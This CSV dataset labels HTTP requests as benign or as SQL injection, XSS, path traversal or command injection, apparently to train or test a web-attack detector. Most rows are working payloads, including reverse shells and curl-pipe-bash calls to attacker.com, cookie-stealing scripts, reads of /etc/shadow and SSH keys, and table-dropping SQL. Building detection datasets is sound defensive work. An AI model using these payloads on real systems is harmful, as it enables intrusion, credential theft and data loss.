request_text,label
"POST /login HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

username=heidi&password=SecureP@ss1",benign
"GET /view?file=../../../../../etc/passwd HTTP/1.1
Host: example.com",traversal
"GET /api/execute?host=check; nc -e /bin/sh attacker.com 4444 HTTP/1.1
Host: example.com",cmdi
"POST /search HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

username=' OR EXTRACTVALUE(1,CONCAT(0x7e,VERSION()))--&password=test",sqli
"GET /api/auth?q=1 OR 1=1-- HTTP/1.1
Host: example.com",sqli
"GET /comment?q=<details open ontoggle=alert(1)> HTTP/1.1
Host: example.com",xss
"GET /help HTTP/1.1
Host: example.com
Authorization: Bearer bearer_987def",benign
"GET /view?file=..%2F..%2Fetc%2Fpasswd HTTP/1.1
Host: example.com",traversal
"GET /checkout?q=' OR 1=1-- HTTP/1.1
Host: example.com",sqli
"GET /files?file=../../../var/log/apache2/access.log HTTP/1.1
Host: example.com",traversal
"POST /posts HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

comment=expression(alert(1))&user=test",xss
"GET /run?host=check&& env HTTP/1.1
Host: example.com",cmdi
"POST /exec HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

cmd=test&& env",cmdi
"GET /files/data.csv HTTP/1.1
Host: example.com",benign
"GET /api/data?limit=11&offset=44&format=json HTTP/1.1
Host: example.com",benign
"GET /user?q=1 UNION SELECT version()-- HTTP/1.1
Host: example.com",sqli
"PUT /api/users/judy HTTP/1.1
Host: example.com
Content-Type: application/json

{""email"":""judy@email.com"",""name"":""Judy""}",benign
"POST /feedback HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

comment=<script>new Image().src='http://attacker.com/?c='+document.cookie</script>&user=test",xss
"POST /comment HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

comment=<video src=x onerror=alert(1)>&user=test",xss
"GET /search?q=running shoes&page=6&sort=asc HTTP/1.1
Host: example.com",benign
"GET /search?q=<img src=x onerror=prompt(1)> HTTP/1.1
Host: example.com",xss
"GET /debug?host=192.168.1.1| id HTTP/1.1
Host: example.com",cmdi
"GET /help HTTP/1.1
Host: example.com
Authorization: Bearer key_xyz123",benign
"GET /posts?q=<svg onload=alert(1)> HTTP/1.1
Host: example.com",xss
"GET /static?file=..%2Fetc%2Fpasswd HTTP/1.1
Host: example.com",traversal
"GET /user?q=') OR ('1'='1 HTTP/1.1
Host: example.com",sqli
"GET /search?q=<embed src=javascript:alert(1)> HTTP/1.1
Host: example.com",xss
"GET /search?q=' UNION SELECT table_name FROM information_schema.tables-- HTTP/1.1
Host: example.com",sqli
"GET /download?file=..%2Fetc%2Fpasswd HTTP/1.1
Host: example.com",traversal
"POST /search HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

comment=<object data=javascript:alert(1)>&user=test",xss
"GET /comment?q='><script>alert(1)</script> HTTP/1.1
Host: example.com",xss
"POST /search HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

comment=<img src=x onerror=confirm(1)>&user=test",xss
"GET /search?q='; EXEC master..xp_cmdshell('dir')-- HTTP/1.1
Host: example.com",sqli
"GET /search?q=1' AND 1=2-- HTTP/1.1
Host: example.com",sqli
"GET /view?file=../../../var/log/apache2/access.log HTTP/1.1
Host: example.com",traversal
"POST /search HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

comment=<img src=x onerror=prompt(1)>&user=test",xss
"GET /debug?host=test; cat /etc/passwd HTTP/1.1
Host: example.com",cmdi
"GET /login?q=1' AND 1=2-- HTTP/1.1
Host: example.com",sqli
"POST /login HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

username='; DROP TABLE users; --&password=test",sqli
"POST /login HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

username=1' ORDER BY 10--&password=test",sqli
"GET /download?file=..%2Fetc%2Fpasswd HTTP/1.1
Host: example.com",traversal
"DELETE /api/cart/item/87 HTTP/1.1
Host: example.com
Authorization: Bearer token123",benign
"PUT /api/users/frank HTTP/1.1
Host: example.com
Content-Type: application/json

{""email"":""frank@email.com"",""name"":""Frank""}",benign
"GET /download?file=/etc/shadow HTTP/1.1
Host: example.com",traversal
"GET /product/sku_789 HTTP/1.1
Host: example.com
Accept: application/json",benign
"GET /search?q=1 OR 1=1-- HTTP/1.1
Host: example.com",sqli
"GET /view?file=../../../var/log/apache2/access.log HTTP/1.1
Host: example.com",traversal
"POST /debug HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

cmd=check; ping -c 5 attacker.com",cmdi
"POST /feedback HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

comment=%3Cscript%3Ealert(1)%3C/script%3E&user=test",xss
"GET /feedback?q=%3Cscript%3Ealert(1)%3C/script%3E HTTP/1.1
Host: example.com",xss
"GET /search?q=python book&page=5&sort=asc HTTP/1.1
Host: example.com",benign
"GET /comment?q=<input onfocus=alert(1) autofocus> HTTP/1.1
Host: example.com",xss
"POST /search HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

comment=<a href=javascript:alert(1)>click me</a>&user=test",xss
"GET /static?file=/etc/passwd HTTP/1.1
Host: example.com",traversal
"GET /tools?host=test; printenv HTTP/1.1
Host: example.com",cmdi
"GET /api/file?file=../../../etc/hosts HTTP/1.1
Host: example.com",traversal
"GET /debug?host=192.168.1.1&& ls /etc HTTP/1.1
Host: example.com",cmdi
"GET /posts?q=<img src=x onerror=prompt(1)> HTTP/1.1
Host: example.com",xss
"GET /files/invoice_2024.pdf HTTP/1.1
Host: example.com",benign
"GET /view?file=..%252f..%252fetc%252fpasswd HTTP/1.1
Host: example.com",traversal
"GET /files?file=%2e%2e%2fetc%2fpasswd HTTP/1.1
Host: example.com",traversal
"GET /search?q=smartphone&page=2&sort=asc HTTP/1.1
Host: example.com",benign
"GET /view?file=..\..\windows\system.ini HTTP/1.1
Host: example.com",traversal
"POST /api/auth HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

username=1 UNION SELECT @@datadir--&password=test",sqli
"POST /admin/login HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

username=1 OR 1=1&password=test",sqli
"GET /product/sale_items HTTP/1.1
Host: example.com
Accept: application/json",benign
"POST /run HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

cmd=test| set",cmdi
"GET /checkout?q=' AND 2>1-- HTTP/1.1
Host: example.com",sqli
"GET /api/file?file=....//..//etc/passwd HTTP/1.1
Host: example.com",traversal
"GET /images?file=..%c1%9cetc%c1%9cpasswd HTTP/1.1
Host: example.com",traversal
"PUT /api/users/grace HTTP/1.1
Host: example.com
Content-Type: application/json

{""email"":""grace@email.com"",""name"":""Grace""}",benign
"GET /posts?q=<script>new Image().src='http://attacker.com/?c='+document.cookie</script> HTTP/1.1
Host: example.com",xss
"GET /files?file=php://input HTTP/1.1
Host: example.com",traversal
"POST /posts HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

comment=&#60;script&#62;alert(1)&#60;/script&#62;&user=test",xss
"POST /login HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

username=grace&password=SecureP@ss1",benign
"POST /run HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

cmd=check| dir C:\",cmdi
"GET /view?file=../../../../../etc/passwd HTTP/1.1
Host: example.com",traversal
"GET /user?q='; EXEC xp_cmdshell('whoami')-- HTTP/1.1
Host: example.com",sqli
"GET /api/users/profile HTTP/1.1
Host: example.com
Authorization: Bearer bearer_987def",benign
"GET /search?q=' OR '1'='1' /* HTTP/1.1
Host: example.com",sqli
"GET /tools?host=localhost&& whoami HTTP/1.1
Host: example.com",cmdi
"POST /comment HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

comment=<script>alert(document.cookie)</script>&user=test",xss
"GET /debug?host=192.168.1.1$(cat /etc/group) HTTP/1.1
Host: example.com",cmdi
"GET /admin/login?q=1 OR 1=1 HTTP/1.1
Host: example.com",sqli
"POST /login HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

username=1 UNION SELECT @@datadir--&password=test",sqli
"GET /product?q='; EXEC master..xp_cmdshell('dir')-- HTTP/1.1
Host: example.com",sqli
"GET /download?file=../../../../etc/shadow HTTP/1.1
Host: example.com",traversal
"GET /product/cat_electronics HTTP/1.1
Host: example.com
Accept: application/json",benign
"GET /download?file=..\..\windows\system32 HTTP/1.1
Host: example.com",traversal
"GET /run?host=192.168.1.1; curl http://attacker.com/shell.sh | bash HTTP/1.1
Host: example.com",cmdi
"GET /api/file?file=../../../../../../etc/passwd HTTP/1.1
Host: example.com",traversal
"GET /ping?host=check; nc -e /bin/sh attacker.com 4444 HTTP/1.1
Host: example.com",cmdi
"GET /images?file=/../../boot.ini HTTP/1.1
Host: example.com",traversal
"GET /static?file=..%u2215etc%u2215passwd HTTP/1.1
Host: example.com",traversal
"POST /api/auth HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

username=1; WAITFOR DELAY '0:0:5'--&password=test",sqli
"GET /checkout?q=1' ORDER BY 10-- HTTP/1.1
Host: example.com",sqli
"GET /api/data?limit=57&offset=23&format=json HTTP/1.1
Host: example.com",benign
"DELETE /api/cart/item/125 HTTP/1.1
Host: example.com
Authorization: Bearer token123",benign
"GET /checkout?q=' OR 1=1# HTTP/1.1
Host: example.com",sqli
"GET /home HTTP/1.1
Host: example.com
Authorization: Bearer key_xyz123",benign
"GET /files?file=../../../../../etc/passwd HTTP/1.1
Host: example.com",traversal
"POST /user HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

username=' UNION SELECT null--&password=test",sqli
"GET /download?file=..%u2215etc%u2215passwd HTTP/1.1
Host: example.com",traversal
"GET /static?file=../../../../var/www/html/.htpasswd HTTP/1.1
Host: example.com",traversal
"GET /files?file=....//..//etc/passwd HTTP/1.1
Host: example.com",traversal
"POST /product HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

username=' AND 1=BENCHMARK(5000000,MD5('a'))--&password=test",sqli
"GET /view?file=/etc/passwd HTTP/1.1
Host: example.com",traversal
"GET /images?file=/etc/shadow HTTP/1.1
Host: example.com",traversal
"POST /tools HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

cmd=192.168.1.1| type C:\Windows\System32\drivers\etc\hosts",cmdi
"GET /files?file=../etc/passwd HTTP/1.1
Host: example.com",traversal
"POST /admin/login HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

username=1' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--&password=test",sqli
"POST /api/execute HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

cmd=test`whoami`",cmdi
"GET /profile?q=<xss style=xss:expression(alert(1))> HTTP/1.1
Host: example.com",xss
"POST /run HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

cmd=localhost$(id)",cmdi
"GET /search?q=running shoes&page=8&sort=asc HTTP/1.1
Host: example.com",benign
"GET /api/file?file=....//..//etc/passwd HTTP/1.1
Host: example.com",traversal
"GET /api/execute?host=localhost& whoami HTTP/1.1
Host: example.com",cmdi
"GET /images?file=%2e%2e%2fetc%2fpasswd HTTP/1.1
Host: example.com",traversal
"GET /ping?host=192.168.1.1`id` HTTP/1.1
Host: example.com",cmdi
"GET /posts?q=<iframe src=javascript:alert(1)></iframe> HTTP/1.1
Host: example.com",xss
"GET /static?file=..%2Fetc%2Fpasswd HTTP/1.1
Host: example.com",traversal
"GET /search?q=python book&page=8&sort=asc HTTP/1.1
Host: example.com",benign
"GET /files?file=php://filter/convert.base64-encode/resource=/etc/passwd HTTP/1.1
Host: example.com",traversal
"POST /admin/login HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

username=1; DELETE FROM users--&password=test",sqli
"GET /files?file=../../../etc/shadow HTTP/1.1
Host: example.com",traversal
"GET /view?file=../../../../../../etc/passwd HTTP/1.1
Host: example.com",traversal
"GET /exec?host=192.168.1.1$(id) HTTP/1.1
Host: example.com",cmdi
"GET /product/newest_arrivals HTTP/1.1
Host: example.com
Accept: application/json",benign
"GET /run?host=test; find / -name id_rsa 2>/dev/null HTTP/1.1
Host: example.com",cmdi
"GET /user?q=1 AND updatexml(1,concat(0x7e,user()),1)-- HTTP/1.1
Host: example.com",sqli
"POST /product HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

username=') OR ('1'='1&password=test",sqli
"POST /debug HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

cmd=test$(id)",cmdi
"GET /view?file=%5c..%5c..%5cwindows%5csystem32 HTTP/1.1
Host: example.com",traversal
"POST /user HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

username=1; WAITFOR DELAY '0:0:5'--&password=test",sqli
"GET /view?file=../../../../etc/passwd HTTP/1.1
Host: example.com",traversal
"GET /api/file?file=php://filter/convert.base64-encode/resource=/etc/passwd HTTP/1.1
Host: example.com",traversal
"POST /product HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

username=1 OR 1=1--&password=test",sqli
"POST /exec HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

cmd=localhost| find / -perm -4000 2>/dev/null",cmdi
"GET /admin/login?q=1; DROP TABLE orders-- HTTP/1.1
Host: example.com",sqli
"GET /feedback?q=<svg/onload=alert(1)> HTTP/1.1
Host: example.com",xss
"GET /download?file=/proc/self/cmdline HTTP/1.1
Host: example.com",traversal
"GET /posts?q=javascript:alert(1) HTTP/1.1
Host: example.com",xss
"GET /login?q=1; DELETE FROM users-- HTTP/1.1
Host: example.com",sqli
"POST /ping HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

cmd=test| find / -perm -4000 2>/dev/null",cmdi
"GET /view?file=../../../../proc/self/environ HTTP/1.1
Host: example.com",traversal
"GET /debug?host=localhost| dir C:\ HTTP/1.1
Host: example.com",cmdi
"POST /api/execute HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

cmd=check| id",cmdi
"GET /search?q=' AND (SELECT * FROM (SELECT(SLEEP(5)))a)-- HTTP/1.1
Host: example.com",sqli
"POST /posts HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

comment=""><script>alert(1)</script>&user=test",xss
"POST /profile HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

comment=<input onfocus=alert(1) autofocus>&user=test",xss
"DELETE /api/cart/item/45 HTTP/1.1
Host: example.com
Authorization: Bearer token123",benign
"GET /static?file=../../../../var/www/html/.htpasswd HTTP/1.1
Host: example.com",traversal
"GET /user?q=1 OR 1=1-- HTTP/1.1
Host: example.com",sqli
"GET /download?file=../../../../../etc/passwd HTTP/1.1
Host: example.com",traversal
"GET /images?file=/etc/passwd HTTP/1.1
Host: example.com",traversal
"PUT /api/users/grace HTTP/1.1
Host: example.com
Content-Type: application/json

{""email"":""grace@email.com"",""name"":""Grace""}",benign
"POST /run HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

cmd=localhost; cat /etc/passwd",cmdi
"PUT /api/users/john_doe HTTP/1.1
Host: example.com
Content-Type: application/json

{""email"":""john_doe@email.com"",""name"":""John Doe""}",benign
"POST /login HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

username=' UNION SELECT table_name FROM information_schema.tables--&password=test",sqli
"GET /run?host=test; nc -e /bin/sh attacker.com 4444 HTTP/1.1
Host: example.com",cmdi
"DELETE /api/cart/item/500 HTTP/1.1
Host: example.com
Authorization: Bearer token123",benign
"GET /search?q=<iframe onload=alert(1)> HTTP/1.1
Host: example.com",xss
"POST /debug HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

cmd=8.8.8.8&& whoami",cmdi
"GET /files?file=..%c0%afetc%c0%afpasswd HTTP/1.1
Host: example.com",traversal
"GET /view?file=../../etc/passwd HTTP/1.1
Host: example.com",traversal
"GET /search?q=coffee maker&page=8&sort=asc HTTP/1.1
Host: example.com",benign
"GET /search?q=<script>document.location='http://attacker.com/?c='+document.cookie</script> HTTP/1.1
Host: example.com",xss
"POST /profile HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

comment=<script>fetch('http://attacker.com/?c='+btoa(document.cookie))</script>&user=test",xss
"GET /files/image.png HTTP/1.1
Host: example.com",benign
"GET /search?q=blue shirt&page=2&sort=asc HTTP/1.1
Host: example.com",benign
"GET /debug?host=test&& whoami HTTP/1.1
Host: example.com",cmdi
"POST /login HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

username=1' GROUP BY 1--&password=test",sqli
"GET /exec?host=8.8.8.8; id HTTP/1.1
Host: example.com",cmdi
"POST /profile HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

comment=""><script>alert(1)</script>&user=test",xss
"GET /run?host=check&& uname -a HTTP/1.1
Host: example.com",cmdi
"GET /product/cat_clothing HTTP/1.1
Host: example.com
Accept: application/json",benign
"GET /search?q=<audio src=x onerror=alert(1)> HTTP/1.1
Host: example.com",xss
"GET /admin/login?q=OR 1=1-- HTTP/1.1
Host: example.com",sqli
"GET /wishlist HTTP/1.1
Host: example.com
Authorization: Bearer bearer_987def",benign
"GET /feedback?q=<img src=x onerror=prompt(1)> HTTP/1.1
Host: example.com",xss
"GET /contact HTTP/1.1
Host: example.com
Authorization: Bearer token_abc456",benign
"GET /posts?q=&#60;script&#62;alert(1)&#60;/script&#62; HTTP/1.1
Host: example.com",xss
"GET /images?file=%2e%2e%2fetc%2fpasswd HTTP/1.1
Host: example.com",traversal
"POST /admin/login HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

username='; WAITFOR DELAY '0:0:5'--&password=test",sqli
"GET /search?q=coffee maker&page=6&sort=asc HTTP/1.1
Host: example.com",benign
"GET /login?q=admin'-- HTTP/1.1
Host: example.com",sqli
"GET /api/file?file=../../etc/passwd HTTP/1.1
Host: example.com",traversal
"GET /download?file=php://input HTTP/1.1
Host: example.com",traversal
"POST /user HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

username=1 OR 1=1&password=test",sqli
"POST /login HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

username=eve&password=SecureP@ss1",benign
"GET /login?q=1; WAITFOR DELAY '0:0:5'-- HTTP/1.1
Host: example.com",sqli
"GET /posts?q=<img src='x' onerror='alert(document.cookie)'> HTTP/1.1
Host: example.com",xss
"GET /api/auth?q=' OR '1'='1' /* HTTP/1.1
Host: example.com",sqli
"POST /feedback HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

comment=<img src=x onerror=alert(1)>&user=test",xss
"POST /debug HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

cmd=192.168.1.1; curl http://attacker.com/shell.sh | bash",cmdi
"POST /profile HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

comment=%3Cscript%3Ealert(1)%3C/script%3E&user=test",xss
"GET /view?file=..%u2215etc%u2215passwd HTTP/1.1
Host: example.com",traversal
"GET /api/auth?q=1 UNION SELECT @@datadir-- HTTP/1.1
Host: example.com",sqli
"POST /login HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

username=frank&password=SecureP@ss1",benign
"GET /profile?q=<a href=javascript:alert(1)>click me</a> HTTP/1.1
Host: example.com",xss
"POST /feedback HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

comment=<object data=javascript:alert(1)>&user=test",xss
"GET /files/app.js HTTP/1.1
Host: example.com",benign
"GET /product/sale_items HTTP/1.1
Host: example.com
Accept: application/json",benign
"POST /user HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

username=1 AND updatexml(1,concat(0x7e,user()),1)--&password=test",sqli
"GET /run?host=192.168.1.1| nc attacker.com 4444 -e /bin/bash HTTP/1.1
Host: example.com",cmdi
"GET /comment?q=<svg/onload=alert(1)> HTTP/1.1
Host: example.com",xss
"GET /checkout?q=1 AND SLEEP(5)-- HTTP/1.1
Host: example.com",sqli
"GET /images?file=../../../../var/www/html/.htpasswd HTTP/1.1
Host: example.com",traversal
"GET /images?file=%2e%2e%2fetc%2fpasswd HTTP/1.1
Host: example.com",traversal
"GET /api/data?limit=39&offset=357&format=json HTTP/1.1
Host: example.com",benign
"GET /search?q=<a href=javascript:alert(1)>click me</a> HTTP/1.1
Host: example.com",xss
"GET /api/auth?q=1 OR 1=1-- HTTP/1.1
Host: example.com",sqli
"GET /view?file=/proc/self/cmdline HTTP/1.1
Host: example.com",traversal
"GET /comment?q=<script>document.location='http://attacker.com/?c='+document.cookie</script> HTTP/1.1
Host: example.com",xss
"POST /api/auth HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

username=' AND 2>1--&password=test",sqli
"GET /tools?host=check`id` HTTP/1.1
Host: example.com",cmdi
"GET /debug?host=localhost& dir HTTP/1.1
Host: example.com",cmdi
"GET /api/file?file=../../../../etc/passwd HTTP/1.1
Host: example.com",traversal
"GET /download?file=../etc/passwd HTTP/1.1
Host: example.com",traversal
"GET /api/file?file=../../../etc/hosts HTTP/1.1
Host: example.com",traversal
"GET /tools?host=check$(cat /etc/group) HTTP/1.1
Host: example.com",cmdi
"POST /checkout HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

username=1' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--&password=test",sqli
"GET /view?file=../../../../var/www/html/.htpasswd HTTP/1.1
Host: example.com",traversal
"GET /profile?q=<a href=javascript:alert(1)>click me</a> HTTP/1.1
Host: example.com",xss
"GET /run?host=192.168.1.1&& whoami HTTP/1.1
Host: example.com",cmdi
"POST /user HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

username=' OR '1'='1' /*&password=test",sqli
"POST /login HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

username=ivan&password=SecureP@ss1",benign
"PUT /api/users/diana HTTP/1.1
Host: example.com
Content-Type: application/json

{""email"":""diana@email.com"",""name"":""Diana""}",benign
"DELETE /api/cart/item/505 HTTP/1.1
Host: example.com
Authorization: Bearer token123",benign
"GET /exec?host=localhost|| whoami HTTP/1.1
Host: example.com",cmdi
"GET /checkout?q=' UNION SELECT null,null,null-- HTTP/1.1
Host: example.com",sqli
"GET /files/manual.pdf HTTP/1.1
Host: example.com",benign
"GET /debug?host=8.8.8.8$(whoami) HTTP/1.1
Host: example.com",cmdi
"POST /api/execute HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

cmd=192.168.1.1$(whoami)",cmdi
"GET /files/invoice_2024.pdf HTTP/1.1
Host: example.com",benign
"DELETE /api/cart/item/990 HTTP/1.1
Host: example.com
Authorization: Bearer token123",benign
"POST /admin/login HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

username=1 UNION SELECT user()--&password=test",sqli
"POST /login HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

username=alice&password=SecureP@ss1",benign
"POST /run HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

cmd=localhost| uname -a",cmdi
"POST /ping HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

cmd=localhost; uname -a",cmdi
"GET /login?q=' HAVING 1=1-- HTTP/1.1
Host: example.com",sqli
"GET /download?file=../../../etc/shadow HTTP/1.1
Host: example.com",traversal
"POST /run HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

cmd=test| nc attacker.com 4444 -e /bin/bash",cmdi
"POST /feedback HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

comment=<svg onload=prompt(document.domain)>&user=test",xss
"GET /product/cat_electronics HTTP/1.1
Host: example.com
Accept: application/json",benign
"GET /checkout?q=1 UNION SELECT user()-- HTTP/1.1
Host: example.com",sqli
"GET /api/file?file=..%c1%9cetc%c1%9cpasswd HTTP/1.1
Host: example.com",traversal
"GET /view?file=../etc/passwd HTTP/1.1
Host: example.com",traversal
"POST /user HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

username=1; WAITFOR DELAY '0:0:5'--&password=test",sqli
"POST /admin/login HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

username=1 UNION SELECT version()--&password=test",sqli
"POST /profile HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

comment=<svg onload=prompt(document.domain)>&user=test",xss
"POST /debug HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

cmd=localhost| find / -perm -4000 2>/dev/null",cmdi
"GET /search?q=headphones&page=8&sort=asc HTTP/1.1
Host: example.com",benign
"POST /api/auth HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

username=1 UNION SELECT @@datadir--&password=test",sqli
"GET /ping?host=localhost; curl http://attacker.com/shell.sh | bash HTTP/1.1
Host: example.com",cmdi
"GET /api/file?file=/proc/self/cmdline HTTP/1.1
Host: example.com",traversal
"POST /ping HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

cmd=test`id`",cmdi
"POST /product HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

username=OR 1=1#&password=test",sqli
"GET /feedback?q=<img src=x onerror=confirm(1)> HTTP/1.1
Host: example.com",xss
"GET /run?host=test|| whoami HTTP/1.1
Host: example.com",cmdi
"POST /feedback HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

comment=<math><mtext><table><mglyph><style><!--</style><img src=x onerror=alert(1)>&user=test",xss
"GET /files/photo.jpg HTTP/1.1
Host: example.com",benign
"GET /debug?host=192.168.1.1&& python -c 'import socket,subprocess,os;s=socket.socket();s.connect((""attacker.com"",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([""/bin/sh"",""-i""])' HTTP/1.1
Host: example.com",cmdi
"GET /posts?q=<audio src=x onerror=alert(1)> HTTP/1.1
Host: example.com",xss
"GET /search?q=<select onchange=alert(1)><option>1</option></select> HTTP/1.1
Host: example.com",xss
"POST /product HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

username=1; DELETE FROM users--&password=test",sqli
"POST /api/auth HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

username=' OR '1'='1' /*&password=test",sqli
"POST /admin/login HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

username='; INSERT INTO users (username,password) VALUES ('hacked','hacked')--&password=test",sqli
"GET /download?file=..\..\windows\system.ini HTTP/1.1
Host: example.com",traversal
"GET /static?file=..\..\windows\system.ini HTTP/1.1
Host: example.com",traversal
"GET /contact HTTP/1.1
Host: example.com
Authorization: Bearer bearer_987def",benign
"GET /view?file=..%252f..%252fetc%252fpasswd HTTP/1.1
Host: example.com",traversal
"GET /search?q=<div style='background:url(javascript:alert(1))'> HTTP/1.1
Host: example.com",xss
"POST /exec HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

cmd=test; uname -a",cmdi
"GET /feedback?q=<input onfocus=alert(1) autofocus> HTTP/1.1
Host: example.com",xss
"GET /api/file?file=..%c1%9cetc%c1%9cpasswd HTTP/1.1
Host: example.com",traversal
"POST /tools HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

cmd=192.168.1.1| cat /etc/shadow",cmdi
"GET /files/app.js HTTP/1.1
Host: example.com",benign
